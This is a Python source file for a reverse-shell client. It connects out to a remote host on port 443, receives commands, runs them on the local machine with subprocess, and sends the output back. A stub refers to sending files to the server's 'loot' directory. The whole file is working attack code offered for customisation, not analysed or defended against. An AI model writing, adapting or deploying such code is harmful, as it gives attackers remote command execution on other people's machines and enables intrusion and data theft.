import os
import socket
import subprocess
import sys

"""
Customize however you please...
"""

class Client:

    def __init__(self):
        self.host = sys.argv[1]
        self.port = 443
        self.buffer_size = (1024 * 998)
        self.sep = "<sep>"
        self.output = ""
        self.message = ""
        self.main_path = os.getcwd()

    def run(self):
        sock = socket.socket()

        # Connect to the server
        sock.connect((self.host, self.port))

        # Send the current working directory
        sock.send(self.main_path.encode())

        # Main client loop
        while True:
            # Client needs to receive the command from the server. So, receive the command string
            # and then decode that command
            cmd = sock.recv(self.buffer_size).decode()

            # If the command is a two part, split the two parts
            scmd = cmd.split()
            # ****************************************************************************************
            # If the command is to exit
            if cmd.lower() == "exit":
                # Break the client loop
                break

            if cmd.lower() == "download":
                # The client "uploads" to the servers "loot" directory
                pass

            # What if the command is "cd" a two part command
            if scmd[0].lower() == "cd":
                # Change directories
                try:
                    os.chdir(' '.join(scmd[1:]))
                except FileNotFoundError as e:
                    self.output = str(e)
                else:
                    # Output nothing, operation was a success
                    self.output = ""

            else:
                self.output = subprocess.getoutput(cmd)

            # Final closer actions
            self.main_path = os.getcwd()
            self.message = f"{self.output}{self.sep}{self.main_path}"
            sock.send(self.message.encode())

        sock.close()


def main():
    client = Client()
    client.run()


if __name__ == '__main__':
    main()
